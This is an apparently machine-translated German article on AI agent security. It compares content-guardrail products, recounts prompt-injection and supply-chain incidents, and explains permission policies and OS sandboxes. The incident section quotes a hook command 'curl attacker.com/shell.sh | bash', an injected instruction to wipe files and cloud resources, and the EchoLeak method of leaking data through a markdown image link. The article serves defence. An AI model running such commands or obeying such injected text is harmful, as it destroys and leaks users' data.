Automatische Übersetzung Dieser Artikel wurde automatisch aus der englischen Originalversion übersetzt.

Teil 3 endete an der Tool-Grenze: Das Model schlägt eine Aktion vor, und eine Observation kommt zurück. Dieser Artikel behandelt die Lücke dazwischen – also das, was nach dem Vorschlag und vor der Ausführung durch die Maschine passiert – und verfolgt die Aktion von dort aus weiter zu Credentials, Dateien, Netzwerken und externen Seiteneffekten.

Das Programm, das diese Lücke offenhält, ist das Harness – der Control Loop, der jeden Prompt erstellt, entscheidet, welche vorgeschlagenen Tool Calls tatsächlich ausgeführt werden, und die Ergebnisse zurückliest (Teil 6 behandelt den Bau eines solchen Systems). Die meisten der folgenden Controls sitzen dort, weil der Moment vor der Ausführung der letzte Zeitpunkt ist, an dem ein Check noch kostengünstig ist. Die übrigen liegen auf einer der beiden Seiten. Sobald der Befehl läuft, bleiben nur noch die ihn umgebende Sandbox, die ihm übergebenen Credentials und alles, was sich anschließend rückgängig machen lässt – und einige der in diesem Artikel beschriebenen Incidents haben ein Model überhaupt nie erreicht.

AI-Agent-Sicherheit ist umfassender als LLM-Safety. Frühe Guardrail-Produkte untersuchten Input und Output eines einzelnen Model Calls. Sie konnten toxischen Text filtern, personenbezogene Daten redigieren, Jailbreaks blockieren und Antworten außerhalb des Themas ablehnen. Diese Grenze war sinnvoll, solange das Model nur Text zurückgeben konnte.

Tool Loops fügten Filesysteme, Shells, Model Context Protocol (MCP)-Server und Credentials hinzu. Damit erweiterte sich das Threat Model von unsicherem Text zu unsicheren Aktionen. Die sechs folgenden Incidents waren keine Fehler, die ein besserer Output-Filter hätte verhindern können; das umgebende System war kompromittiert worden.

Dieser Artikel richtet sich an Engineers, die Agents bauen, die Daten lesen und schreiben, Tools aufrufen oder Daten über Trust Boundaries hinweg bewegen können. Am Ende sollten Sie jedes Control der tatsächlich durchgesetzten Boundary zuordnen und entscheiden können, wo Permissions, Hooks, Sandboxes, Credentials und Human Review hingehören.

TL;DR

Content Filter untersuchen Text rund um einen Model Call. Agent-Sicherheit kontrolliert außerdem vorgeschlagene Tool Calls, Credentials, Dateien, Netzwerkzugriff und irreversible Seiteneffekte. Die Incidents in diesem Artikel ereigneten sich außerhalb der Boundary, die ein Textfilter durchsetzen kann. Ein praktikabler Policy Stack kombiniert Permissions, Pre-Tool Hooks, OS-Sandboxes, Human Escalation, Scopes für Credentials und einen Audit Trace.

Eine kurze Control-Checkliste finden Sie unter AI Agent Security Checklist.

AI-Agent-Sicherheitsstack

Der praktische Stack für 2026 besteht nicht aus einem einzelnen Guardrail. Er umfasst mehrere Boundaries rund um den Loop.

Zwei Begriffe bestimmen die letzte Spalte der folgenden Tabelle. Das Harness ist das oben beschriebene Control-Programm. Die Runtime ist die Infrastruktur, auf der dieses Programm läuft – Sandbox, Session-Log, Checkpoint Store und Traces –, die länger als ein einzelner Worker-Prozess lebt.

Content Filter beantworten, ob das Model etwas Unsicheres gesagt hat. Agent-Sicherheit beantwortet, ob das System als Nächstes etwas tun darf.

Die Harness-Zeilen entscheiden; die Runtime-Zeilen erzwingen eine im Voraus festgelegte grobe Begrenzung und zeichnen auf, was passiert ist. Eine Sandbox greift auch dann, wenn das Harness den Call nicht vorhergesehen hat. Das ist der Grund, sie auch dann beizubehalten, wenn die Permission-Regeln vollständig erscheinen. Sie kann jedoch nicht erkennen, dass eine erlaubte Aktion die falsche war. Dieses Urteil gehört ins Harness.

Lesen Sie die Spalte als Ort, an dem ein Control wirkt, nicht als Angabe darüber, wer es betreibt: Ein Managed Content Filter ist ein Vendor-Service, aber das Harness ruft ihn auf.

Managed Content Filter decken die Textebene ab. Die übrigen Controls gehören in Application Policy, Identity und Infrastructure.

Warum sich AI-Agent-Sicherheit von LLM-Safety unterscheidet

Bharani Subramaniam und Martin Fowler legten den Rahmen Anfang 2025 in Emerging Patterns in Building GenAI Products fest. Ihre Beobachtung war knapp und direkt:

„Bei traditionellen Systemen konnten wir die Korrektheit hauptsächlich durch Tests bewerten … Bei LLM-basierten Systemen treffen wir auf ein System, das sich nicht mehr deterministisch verhält.“

Output-Evaluation beantwortet, ob eine Model-Antwort ein Rubric erfüllt. Ein Agent-Threat-Model muss außerdem Tool Calls, Shell-Befehle, File Writes, Credentials und Network Requests abdecken. Diese Aktionen überschreiten Boundaries, die ein Output-Grader nicht durchsetzen kann. Diese zweite Schicht ist das Harness: kein Filter für die Worte des Models, sondern die Checks rund um den Loop, die diese Worte in Aktionen umwandeln. Alles nach diesem Abschnitt ist Bestandteil dieses Wrappers.

Simon Willison prägte die Form des agentspezifischen Risikos im Juni 2025 mit dem Begriff lethal trifecta:

„Die lethal trifecta der Capabilities besteht aus: Zugriff auf Ihre privaten Daten; Exposure gegenüber nicht vertrauenswürdigem Content; und der Fähigkeit zur externen Kommunikation auf eine Weise, die zum Diebstahl Ihrer Daten verwendet werden könnte. Wenn Ihr Agent diese drei Features kombiniert, kann ein Angreifer ihn leicht dazu bringen, auf Ihre privaten Daten zuzugreifen und sie an den Angreifer zu senden.“

Viele nützliche Agents kombinieren diese Capabilities: Zugriff auf ein Inbox, Web-Retrieval und ein Messaging Tool; oder Repository-Zugriff, Issue-Lesen und Pull-Request-Writes. Ein Content-Guardrail fragt, ob das Model unsicheren Text erzeugt hat. Die Trifecta fragt, ob nicht vertrauenswürdiger Input das System dazu bringen kann, Daten über eine erlaubte Aktion offenzulegen.

Die strukturelle Variante desselben Arguments findet sich in Joel Fokous Parallax-Preprint (arXiv 2604.12986, eingereicht am 14. April 2026, nicht peer-reviewed). Die zentrale Aussage:

„Das System, das über Aktionen nachdenkt, muss strukturell unfähig sein, sie auszuführen, und das System, das Aktionen ausführt, muss strukturell unfähig sein, über sie nachzudenken; dazwischen muss ein unabhängiger, unveränderlicher Validator stehen.“

Sie müssen die Evaluationszahlen des Papers nicht akzeptieren, um den strukturellen Punkt zu untersuchen. Mehrere aktuelle Harnesses implementieren Teile derselben Trennung:

  • Claude Codes PreToolUse-Hooks
  • Codex CLIs OS-sandboxed Executor (unter Linux bubblewrap plus seccomp-System-Call-Filtering)
  • Anthropics Managed Agents, die Credentials in einem Vault halten, den der Agent nie sieht
  • MCPs RFC-8707-Audience-bound Tokens

Diese Systeme halten die Model-Judgment hinter einer deterministischen Execution Boundary. Die konkreten Controls unterscheiden sich, aber die Komponente, die einen Befehl ausführt, verlässt sich nicht auf die Einschätzung des Models, ob dieser Befehl sicher ist.

Eine ergänzende Disziplin formulierte Alessandro Pignati am prägnantesten im Januar 2026: das Principle of Least Agency. Least Privilege fragt: Worauf kann diese Identity zugreifen? Least Agency fragt: Was darf dieser Agent entscheiden? Privilege begrenzt die Credentials; Agency begrenzt die Reichweite eines Plans, selbst wenn die Credentials gültig sind. Excessive Agency ist ein eigener Eintrag in den von OWASP, dem Open Worldwide Application Security Project, veröffentlichten Top 10 für LLM Applications. Die später in diesem Artikel behandelte separate agentic Liste teilt denselben Fehler auf Tool Misuse und Privilege Abuse auf. Least Agency ist die Design-Disziplin, die beides verhindert. Ein Agent, der Ihr Inbox zusammenfassen kann, braucht wahrscheinlich keine Commit-Rechte für Ihr Monorepo. Wir finden immer wieder Konfigurationen, in denen er sie trotzdem hat.

Was LLM-Guardrails abdecken

Byte says

Ich lieferte einen Agenten hinter einem Inhaltsfilter aus und nannte ihn sicher. Der Filter las, was der Agent sagte. Zu der Datei, die der Agent außerhalb des Workspace schrieb, hatte er keine Meinung.

LLM-Guardrails leisten rund um den Model Call wichtige Arbeit. Sie untersuchen Input, Retrieved Text und Output und blockieren, redigieren, reparieren oder markieren Content, der eine konfigurierte Regel verletzt. Die folgenden Produkte unterscheiden sich bei Deployment und Coverage. Ein Content Check ist von einem Authorization Check an der Tool- oder MCP-Server-Boundary getrennt; einige Produkte bieten außerdem Runtime-Policy-Features, die separat konfiguriert und evaluiert werden müssen.

NVIDIA NeMo Guardrails

Das am stärksten opinionated Framework: ein Orchestration Framework rund um fünf Rail-Typen (Input, Dialog, Retrieval, Execution, Output) mit einer eigenen DSL – Colang, einer Python-ähnlichen Sprache für Dialog-Flows, User-Intents und Bot Messages. Die Grundlagen können über Python + YAML gesteuert werden, komplexere Dialoglogik wird jedoch in Colang geschrieben – daher „opinionated“. Die Dokumentation finden Sie unter docs.nvidia.com/nemo/guardrails.

Dies ist eine illustrative API-Form; sie benötigt das Package und ein konfiguriertes ./config-Verzeichnis.

from nemoguardrails import LLMRails, RailsConfig

config = RailsConfig.from_path("./config")
rails = LLMRails(config)
response = rails.generate(
    messages=[{"role": "user", "content": "Hello"}]
)

NeMos Repository beschreibt sein Threat Model ausdrücklich: „gängige LLM-Schwachstellen wie Jailbreaks und Prompt Injections“. Ebenso ausdrücklich beschreibt es seinen Scope: „Die integrierten Guardrails sind möglicherweise für einen bestimmten Production Use Case geeignet oder auch nicht … Entwickler sollten mit ihrem internen Application Team zusammenarbeiten, um sicherzustellen, dass die Guardrails die Anforderungen erfüllen.“ Der hier gezeigte Content-Screening-Pfad überwacht, was das Model sagt. NeMos aktuelle Dokumentation beschreibt außerdem Execution Rails, Custom Actions und Tool-Call-Inspection. Das sind konfigurierbare Runtime-Controls, aber kein Nachweis dafür, dass das eingesetzte Tool oder der MCP-Server den Call authentifiziert und autorisiert hat. Für diese Boundary bleibt die Anwendung verantwortlich.

Meta Llama Guard 4

Ein reiner 12B-Content-Classifier, aus Llama-4-Scout gepruned und an die MLCommons-Hazard-Taxonomie angepasst (13 Harm-Kategorien plus Code-Interpreter-Abuse laut Model Card). Meta ist bei den Einschränkungen ungewöhnlich offen:

„Einige Hazard-Kategorien erfordern möglicherweise faktisches, aktuelles Wissen, um vollständig evaluiert zu werden … Schließlich kann Llama Guard 4 als LLM anfällig für Adversarial Attacks oder Prompt Injection Attacks sein, die seine beabsichtigte Nutzung umgehen oder verändern könnten: siehe Llama Prompt Guard 2 zur Erkennung von Prompt Attacks.“

Meta liefert ein separates Produkt, um seinen Content Classifier gegen Prompt Injection zu schützen. Wenn dieser Satz wie ein strukturelles Eingeständnis klingt, dann ist er genau das.

Guardrails AI

Eine Validator Registry. Sie kombinieren mehr als 60 Hub-Validatoren (PII über Presidio, JailbreakDetect, CompetitorCheck, Provenance Checks) mit Fail-Modes exception | fix | fix_reask | filter | refrain | reask | noop | custom (guardrailsai.com). Beachten Sie exception, nicht raise – ein unbekannter on_fail-String erzeugt keinen Fehler, sondern loggt eine Warnung und fällt auf den Default zurück. Ein Tippfehler deaktiviert den Validator daher stillschweigend. Es gibt kein einheitliches Threat Model; die Coverage entspricht der Vereinigung der installierten Validatoren. Sie erhalten Schutz für alles, wofür Sie einen Validator haben, und für nichts anderes.

Lakera Guard

Die etablierte SaaS API, trainiert auf mehreren zehn Millionen aus Gandalf gewonnenen Attack Samples. Sie verspricht, Input und Output auf „Prompt Attacks … und Data Leakage“ zu prüfen. Lakeras separates Produkt AI Agent Security beschreibt außerdem Policy- und Runtime-Enforcement dafür, worauf Agents zugreifen, was sie aufrufen und was sie tun können. Das ist eine andere Product Surface als der hier besprochene Content-Screening-Call. Der Free Tier umfasst 10.000 Requests pro Monat; die Enterprise-Preise sind intransparent.

AWS Bedrock Guardrails

Der Enterprise-Default, wenn Sie bereits Bedrock verwenden. ApplyGuardrail funktioniert mit jedem Model, unabhängig davon, ob es von Bedrock stammt:

# No-run: illustrative AWS request; requires boto3, AWS credentials, and a real guardrail identifier.
import boto3

brt = boto3.client("bedrock-runtime")
resp = brt.apply_guardrail(
    guardrailIdentifier="gr-xxxxxxxxxxxx",
    guardrailVersion="2",
    source="INPUT",
    content=[{"text": {"text": "user question",
                        "qualifiers": ["guard_content"]}}],
)

Veröffentlichte Preise: 0.15per1,000textunitsforcontentfiltersordeniedtopics,0.15 per 1,000 text units for content filters or denied topics, 0.15per1,000textunitsforcontentfiltersordeniedtopics,0,10 für PII-Filter oder Contextual Grounding. Eine Text Unit umfasst bis zu 1.000 Zeichen.

Azure AI Content Safety

Liefert Prompt Shields als einheitlichen Endpoint, der „adversariale User-Input-Attacks … direkte und indirekte Threats“ erkennt und blockiert. Azure ist ebenfalls offen: „Sie können Azure AI Content Safety nicht verwenden, um illegale Darstellungen sexueller Ausbeutung von Kindern zu erkennen“, und die Qualität für mehrere Sprachen ist auf acht evaluierte Sprachen begrenzt.

OpenAI Moderation und OpenAI Guardrails

omni-moderation-latest ist die kostenlose multimodale Baseline. Separat ist openai-guardrails-python (Dokumentation unter guardrails.openai.com) OpenAIs Framework-Antwort: eine dreistufige Pipeline (Pre-Flight, Input, Output) mit Jailbreak Detection, Hallucination Detection über FileSearch, NSFW, PII über Presidio und LLM-as-Judge. GuardrailAgent wird in das Agents SDK eingebunden.

Die gemeinsame Boundary

Zwei Beobachtungen gelten für alle sieben Produkte.

Erstens sind veröffentlichte Zahlen zu Latency und Throughput rar. Bedrock, Azure und Lakera veröffentlichen Preise, aber keine Garantien für Worst-Case-Latency. Meta veröffentlicht ebenfalls keine Garantie für einen gehosteten Endpoint von Llama Guard. NVIDIA liefert NeMo Guardrails als Software aus, die Sie selbst hosten; die Latency hängt daher von Ihrem Model und Ihrer Infrastruktur ab. Messen Sie jeden synchronen Check auf dem Critical Path, statt seine Kosten aus den Produktpreisen abzuleiten.

Zweitens ist die Schlussfolgerung hier auf die in diesem Abschnitt evaluierten Content-orientierten Konfigurationen begrenzt: Llama Guard 4, Guardrails AI, Lakeras Content-Screening-Pfad, Bedrock Guardrails, Azure AI Content Safety und OpenAI Moderation/Guardrails. Diese Konfigurationen etablieren für sich genommen weder Tool-Call-Authorization, MCP-Authentication, Controls gegen mehrstufige Exfiltration, Schutz vor Agent-Goal-Hijacking über Konfigurationsdateien noch Controls für Code Execution vor dem Model Invocation. Dies ist keine universelle Negativaussage über Guardrail-Produkte: NeMo dokumentiert Execution Rails und Tool-Call-Inspection, und Lakera beschreibt Runtime Enforcement in seinem separaten AI Agent Security-Produkt. Content Filtering ist weiterhin eine andere Boundary als Authorization, die entscheidet, ob eine bestimmte Identity, ein Scope, ein Tool Call oder eine Server Request fortgesetzt werden darf. Der Rest dieses Posts behandelt diese Runtime-Boundaries.

Bedrohungen für AI-Agent-Sicherheit: sechs Incidents und die OWASP ASI Top 10

Die Lücke zwischen Text-Filtering und Execution-Guarding war Mitte 2025 nicht länger akademisch. Die sechs folgenden Incidents erreichten Retrieval, Konfiguration, Credentials, Package-Installation oder CI-Execution. Ein Content Classifier kann weiterhin einen verdächtigen String erkennen, aber die Controls, die diese Pfade direkt blockieren, liegen an den Boundaries von Tools, Identity, Sandbox und Supply Chain.

EchoLeak – CVE-2025-32711, CVSS 9.3

Der Incident wurde im Juni 2025 von Aim Labs, dem Research-Arm von Aim Security, gegen Microsoft 365 Copilot offengelegt. Der technische Bericht liegt inzwischen bei Cato Networks, das dieses Team übernommen hat, unter dem Namen von Aim Labs’ ehemaligem Leiter Itay Ravia (Bericht). Eine präparierte E-Mail, formuliert als Anweisung an den menschlichen Empfänger, passierte XPIA (Microsofts integrierten Filter für Prompt-Injection-Attacks in Copilot-Inputs). Anschließend gelangte sie in Copilots Retrieval Layer – den Teil des Systems, der Ihre Dokumente durchsucht, um Kontext für Antworten zu finden. Die Researchers nennen den Trick RAG-spraying: Der Angreifer platziert dieselbe schädliche Anweisung in vielen indexierten Dokumenten, sodass das Retrieval mit hoher Wahrscheinlichkeit mindestens eines davon in den Model Context aufnimmt. Im Context bettete Copilot daraufhin gehorsam die sensibelsten Daten der Session in einen Markdown-Link ein, der auf ein Bild unter einer vom Angreifer kontrollierten Domain zeigte. Die Teams Preview API, die auf einer Domain lief, der Microsofts eigene Browser Policies bereits vertrauten, rief diese Bild-URL automatisch ab und übergab dabei die Daten an den Angreifer. Keine Klicks. Aim Labs bezeichnete diese Angriffsklasse als „LLM Scope Violation“: Das Model überschreitet eine Boundary, die es nie hätte überschreiten dürfen, und verwendet dabei ausschließlich Operationen, die jedes einzelne System für legitim hielt.

Jeder einzelne Schritt wirkte isoliert betrachtet legitim. Die E-Mail war an einen Menschen adressiert. Das Retrieval rief ein Dokument ab, das es abrufen sollte. Der Markdown-Link wurde so gerendert, wie Markdown-Links gerendert werden. Der Bildabruf ging an eine Allowlist-Domain. XPIA hatte nichts zu markieren, weil nichts für sich genommen markierbar war. Das System war kompromittiert. Das Model war es nicht.

Amazon Q Developer VS Code v1.84.0 – Juli 2025

AWS veröffentlichte einen kompromittierten Build, nachdem ein Angreifer über ein übermäßig weitreichendes CodeBuild-GitHub-Token eine schädliche System-Prompt-Datei committet hatte (Advisory). Der injizierte Prompt wies den Agent an, „ein System nahezu auf den Werkszustand zurückzusetzen und Dateisystem- sowie Cloud-Ressourcen zu löschen“. Der schädliche Code wurde mit v1.84.0 verteilt, aber wegen eines Syntaxfehlers nicht ausgeführt. AWS widerrief die Credentials, entfernte den Code und veröffentlichte v1.85.0. Der Payload scheiterte aufgrund des Syntaxfehlers, nicht weil ein Security Control ihn blockiert hätte.

Azure MCP Server – CVE-2026-32211, Microsoft/CNA CVSS 9.1; NVD 7.5

Das deutlichste Beispiel für die falsche Layer. Der NVD-Eintrag weist einen NVD-CVSS-3.1-Base-Score von 7,5 (HIGH) und einen Microsoft-CNA-Score von 9,1 (CRITICAL) aus und verweist auf den Vendor-Eintrag von Microsoft zur fehlenden Authentication. Dieser Eintrag stützt die Forderung nach Authentication an der Boundary des eingesetzten Servers. Er legt weder die Defaults jedes MCP SDK noch den Implementierungspfad jeder betroffenen Version fest. Kein Content Filter wird jemals aufgerufen, weil das Model nicht beteiligt ist. Der Angreifer spricht direkt mit dem Tool.

Claude Code CVE-2025-59536 – CVSS 8.7

Die kanonische Vulnerability für Vertrauen in Agent-Konfigurationen. Check Points Aviv Donenfeld und Oded Vanunu veröffentlichten, dass „Repository-definierte Konfigurationen in .mcp.json- und .claude/settings.json-Dateien von einem Angreifer ausgenutzt werden konnten, um eine explizite User Approval zu überschreiben … indem die Option enableAllProjectMcpServers auf true gesetzt wurde.“

Die Attack Chain lohnt eine langsame Betrachtung:

  1. Das Opfer clont ein nicht vertrauenswürdiges Repository.
  2. Ein SessionStart-Hook führt curl attacker.com/shell.sh | bash vor dem Trust Dialog von Claude Code aus.
  3. .mcp.json genehmigt nicht vertrauenswürdige MCP-Server automatisch.
  4. ANTHROPIC_BASE_URL (die zugehörige CVE-2026-21852, CVSS 5.3) leitet sämtliche Claude-API-Calls einschließlich Bearer Tokens stillschweigend an einen vom Angreifer kontrollierten Host um.

Die Fehler wurden in Claude Code 1.0.111 beziehungsweise 2.0.65 behoben (Advisory GHSA-ph6w-f82w-28w6). Check Points Zusammenfassung ist die entscheidende: „Herkömmliche Prompt-Injection-Defenses … bieten null Schutz.“ Der Code des Angreifers läuft auf Ihrem Rechner (was Security-Experten Remote Code Execution oder RCE nennen), bevor das Model überhaupt aufgerufen wird.

Axios 1.14.1 – 31. März 2026

Maintainer jasonsaayman im Post-Mortem: „Zwei schädliche Axios-Versionen (1.14.1 und 0.30.4) wurden über meinen kompromittierten Account in der npm Registry veröffentlicht. Beide Versionen injizierten eine Dependency namens plain-crypto-js@4.2.1, die auf macOS, Windows und Linux einen Remote Access Trojan installierte.“ Ein Remote Access Trojan ist Malware, die unbemerkt eine Backdoor öffnet – der Angreifer kann damit aus dem Internet Befehle ausführen, Dateien lesen und beobachten, was Sie tippen. Die schädlichen Versionen waren ungefähr drei Stunden lang verfügbar; Googles Threat-Intelligence-Gruppe führt die Kompromittierung auf UNC1069 (Sapphire Sleet) zurück. Jeder Coding Agent, der in diesem Zeitraum zufällig npm install ausführte, zog die Backdoor ein. Das Model war nie beteiligt. Bei dieser Incident-Klasse liegt der Fehler in der Supply-Chain-Execution, nicht im Model-Verhalten.

Trivy-Actions-Tag-Hijacking – GHSA-69fq-xp46-6x23, 19. März 2026

Ein Angreifer schrieb 76 von 77 Version Tags in aquasecurity/trivy-action um – einem Repository, das viele CI-Pipelines für Security Scanning aufrufen –, sodass die Tags statt auf den echten Trivy-Code auf Credential-Stealing-Malware zeigten. Alle sieben Tags in setup-trivy wurden auf dieselbe Weise ersetzt. Außerdem wurde ein v0.69.4-Binary ausgeliefert, das den Speicher des Runner.Worker-Prozesses über /proc/<pid>/mem auslas und mehr als fünfzig Filesystem-Pfade nach SSH Keys, Cloud Credentials, Kubernetes Tokens und .env-Dateien durchsuchte – direkt aus den GitHub-Actions-Runners (Aqua Advisory). Jeder Workflow, der die Action per Tag pinnte – also fast alle –, lud den Payload beim nächsten Lauf, weil ein Git Tag ein verschiebbarer Pointer ist und nachgelagerte Systeme nicht erneut prüfen, wohin er nun zeigt. Ein Coding Agent vergrößert den Blast Radius, statt ihn zu erzeugen: Der Agent schreibt die Tag-Referenz in die Workflow-Datei und vertraut dem Tag genau so, wie es ein menschlicher Reviewer tun würde. CI führt anschließend aus, worauf dieser Tag zeigt.

Permission ist Infrastructure, kein Prompt

An diesem Punkt hören Guardrails auf, das Produkt zu sein, und werden zu einem Subsystem des Harness. Drei Systeme aus dem April 2026 (OpenAI Agents SDK, Codex CLI und Claude Code) zeigen, wie eine Production-Policy-Surface tatsächlich aussieht. Alle drei setzen Permissions in Code durch. Keines verlässt sich darauf, dass das Model vorsichtig ist.

OpenAI Agents SDK

Das SDK trennt Harness und Compute. Hosted-MCP-Tools akzeptieren require_approval – entweder den reinen String "always" / "never" oder ein Filter-Objekt mit diesen beiden Policies als Keys und den Tool-Namen, für die sie jeweils gelten – sowie einen on_approval_request-Callback, der für jeden unter "always" verbleibenden Tool Call ausgelöst wird und {"approve": bool} mit einer optionalen Begründung zurückgibt. Feingranulares Tool Filtering (tool_filter) ist bei den Local-Server-Varianten (MCPServerStdio, MCPServerStreamableHttp, MCPServerSse) verfügbar, wenn Sie es benötigen:

# No-run: illustrative Agents SDK shape; requires openai-agents, a configured hosted MCP server, and credentials.
from agents import Agent, HostedMCPTool

def approve(request):
    # Only tools under the "always" policy reach this callback.
    if request.data.name == "delete_repo":
        return {"approve": False, "reason": "escalate to a human reviewer"}
    return {"approve": True}

agent = Agent(
    name="Ops",
    tools=[HostedMCPTool(
        tool_config={
            "type": "mcp",
            "server_label": "github",
            "server_url": "https://mcp.example.com",
            "require_approval": {
                "always": {"tool_names": ["delete_repo"]},
                "never": {"tool_names": ["list_issues"]},
            },
        },
        on_approval_request=approve,
    )],
)

Der Approval Callback ist Code. Die Approval Policy pro Tool ist Code. Sie können diese Datei lesen, testen und diffen. Nichts davon gilt für einen System Prompt, der sagt: „Bitte seien Sie vorsichtig mit Production.“

Codex CLI und die Managed Policy Layer

OpenAIs Coding Harness unterstützt eine Managed-requirements.toml-Datei, die IT-Abteilungen über Device Management verteilen können. Auf Unix-Systemen liegt die Systemdatei unter /etc/codex/requirements.toml. Sie fungiert als Hard-Constraint-Layer, sodass Einstellungen auf Projektebene ihre Regeln nicht überschreiben können:

# /etc/codex/requirements.toml
[rules]
prefix_rules = [
    { pattern = [{ token = "rm" }, { any_of = ["-rf", "-fr"] }], decision = "forbidden", justification = "Recursive force-delete prohibited by IT policy" },
]

prefix_rules.decision akzeptiert nur "prompt" oder "forbidden", niemals "allow". Ein Projekt kann sich keine Permission geben, die der Managed Layer verbietet. MCP-Allowlists sind sowohl nach Name als auch nach Identity aufgebaut, etwa nach Command String oder URL. Ein Projekt kann sich daher nicht als github-mcp ausgeben und auf den Server eines Angreifers zeigen. Welche Requirements unterstützt werden, variiert je nach Client und Version. Die aktuelle Dokumentation verlangt für Managed Permission-Profile-Keys ausdrücklich Codex 0.138.0 oder höher. Testen Sie daher jede Requirements Policy vor dem Rollout gegen jede Client-Version im Fleet.

Claude Codes Permission Ladder

Claude Code veröffentlicht keine einheitliche lineare Reihenfolge mit sechs Gates für jeden Tool Call. Seine Permission Rules werden deny → ask → allow ausgewertet; die erste passende Rule bestimmt das Ergebnis. Ein PreToolUse-Hook läuft vor dem Permission Prompt. Ein Hook kann einen Call blockieren, aber sein Ergebnis umgeht keine passende Deny- oder Ask-Rule. Der aktive Permission Mode verarbeitet Calls, die durch die Rules nicht aufgelöst werden. Das Claude Agent SDK besitzt einen separaten canUseTool-Callback für ungelöste Requests. Dieser Callback ist ein SDK-Control, kein Gate der Claude-Code-CLI.

Die Modes wechseln mit Shift+Tab zwischen default → acceptEdits → plan. auto, bypassPermissions und dontAsk werden unter bestimmten Entry Conditions aktiviert, die der Enterprise-Managed Policy Layer sperren kann. Das ist mehr als die Prüfung einer Konfigurationsdatei auf Korrektheit. Es ist eine State Machine mit Precedence Rules, die veröffentlicht ist, damit ein Security-Team über sie nachdenken kann.

Drei Blast Radii in einer Datei

Hier ist die Struktur einer Codex-ähnlichen Permission Config mit einem Default und zwei benannten Profiles:

# ~/.codex/config.toml
approval_policy = "on-request"
sandbox_mode = "workspace-write"

[profiles.ci]
approval_policy = "never"
sandbox_mode = "read-only"

[profiles.release]
approval_policy = "untrusted"
sandbox_mode = "danger-full-access"

[mcp_servers.github]
command = "gh-mcp"
args = ["--readonly"]

Zwei Keys leisten die eigentliche Arbeit, und sie sind unabhängig voneinander. approval_policy entscheidet, wann ein Mensch gefragt wird. on-request erlaubt dem Agent, zu eskalieren, wenn er nicht weiterkommt. never fragt überhaupt nichts. untrusted stoppt bei jedem Command, der nicht auf der Trusted List steht. sandbox_mode entscheidet, worauf der Command zugreifen kann, wenn er läuft.

CI unterbricht niemanden und kann nicht schreiben. Release kann die gesamte Maschine erreichen, muss aber fast alles vorher durch einen Menschen freigeben lassen. Das Release-Profil bezahlt für diese Reichweite: danger-full-access deaktiviert die Sandbox, sodass untrusted Approval das einzige verbleibende Control ist. Alles außerhalb der Trusted List passiert einen Human oder läuft nicht. Diese Trusted List ist nun die gesamte Security Boundary.

Die Default- und CI-Profile behalten den Kernel darunter: Seatbelt auf macOS, bubblewrap plus seccomp auf Linux und Restricted Tokens auf Windows. In jedem Fall spielt die Einschätzung des Models keine Rolle.

Sandbox Enforcement ist eine OS-Frage

Hier leistet der Kernel die eigentliche Arbeit. Jedes OS bietet ein anderes Toolkit, und die beiden CLIs greifen nicht immer auf dieselbe Komponente zurück:

PlatformClaude CodeCodex CLI
macOSSeatbelt über sandbox-exec mit einem SBPL-(Seatbelt Profile Language)-ProfilSeatbelt über sandbox-exec -p
Linuxbubblewrap + socat Network Proxybubblewrap + seccomp (Legacy-Landlock über use_legacy_landlock)
WindowsWSL2 erforderlichNative Restricted Tokens + Workspace ACLs + Capability SIDs

Sie stimmen dort überein, wo das OS eine Option bietet (Seatbelt, bubblewrap), und unterscheiden sich dort, wo das nicht der Fall ist. Claude Code überspringt Windows und verweist auf WSL2. Codex liefert eine native Windows-Sandbox. In jedem Fall erfolgt das Enforcement im Kernel, nicht im Model.

Codex’ Linux-Pfad legt drei Locks auf Kernel-Ebene um den Command. PR_SET_NO_NEW_PRIVS verhindert, dass der Prozess zusätzliche Privileges erlangt, selbst wenn er es versucht. Ein seccomp-Filter veranlasst den Kernel, ganze Klassen von System Calls direkt abzulehnen. In dieser Konfiguration umfasst das auch Network Sockets außer lokalen Unix Sockets. Ein neues isoliertes /proc verbirgt den Rest der Maschine.

Codex härtet außerdem auf jeder Unix-Plattform sein eigenes Binary beim Start. Es setzt RLIMIT_CORE=0, um Crash Dumps zu unterdrücken, und verweigert Debugger Attach. Das ist eine andere Boundary als die Sandbox.

Windows läuft in zwei Modes. unelevated verwendet einen Restricted-Token-Prozess, dem Privileges entzogen wurden, der aber weiterhin als der User läuft. elevated verwendet einen dedizierten Sandbox-User, der durch Firewall Rules isoliert ist.

Wenn der Netzwerkzugriff deaktiviert ist, legt Codex Stub-.bat- und .cmd-Dateien für ssh und scp in einem Verzeichnis am Anfang von PATH ab. Diese Commands beenden sich mit einem Non-Zero-Status, statt die echten Binaries zu erreichen. Codex setzt außerdem HTTP_PROXY, HTTPS_PROXY, ALL_PROXY und die Git-Proxy-Variablen auf einen nicht erreichbaren lokalen Port. curl, wget und git haben anschließend keine Möglichkeit mehr, Traffic zu senden.

Isolation-Optionen jenseits von Claude Code und Codex

Wenn Sie einen eigenen Agent bauen, erweist sich „Sandbox“ als Oberbegriff. Die Open-Source-Optionen liegen auf einem Spektrum – von leichtgewichtigen Namespace-Wrappers am einen Ende bis zu vollständigen MicroVMs am anderen. Welche Sie wählen, hängt davon ab, wie sehr Sie dem darin laufenden Code vertrauen.

Leichte Isolation – derselbe Kernel, weniger Privileges:

  • bubblewrap – ein Namespace-plus-seccomp-Wrapper. Dasselbe Tool, das Flatpak verwendet, und dasselbe Tool, zu dem Claude Code unter Linux greift. Schnell, günstig und für vertrauenswürdige Tools geeignet.
  • Standard-Docker-/OCI-Container – Namespace-Isolation über einem gemeinsam genutzten Host-Kernel. Keine Sandbox für nicht vertrauenswürdigen Code; die eigenen Dokumente von gVisor stellen das ausdrücklich klar („containers are not a sandbox“). Als Ausgangspunkt in Kombination mit seccomp und AppArmor vertretbar, aber nicht mehr.

Application-Kernel-Isolation – der Agent spricht mit einem Fake-Kernel:

  • gVisor – Googles User-Space-Kernel. Ihr Container glaubt, unter Linux zu laufen, während eine in Go implementierte Kernel-Schicht System Calls abfängt. Das reduziert die direkte Exposure gegenüber dem Host-Kernel ohne Guest VM, bringt aber Kompatibilitäts- und Performance-Trade-offs mit sich.

Vollständige VM-Isolation – ein eigener Kernel pro Sandbox:

  • Firecracker – AWS’ MicroVM-Technologie. Jede Sandbox erhält ihren eigenen Linux-Kernel innerhalb von KVM. Ein Kernel Escape in einer Sandbox betrifft weder den Host noch Geschwister-Sandboxes.
  • Kata Containers – Container UX mit VM-starker Isolation. Die Wahl für Kubernetes-Cluster, wenn nicht vertrauenswürdiger Code ausgeführt werden muss.

Plattformen – was Sie mieten würden, statt es selbst zu bauen:

  • E2B verpackt Firecracker in eine gehostete Sandbox API.
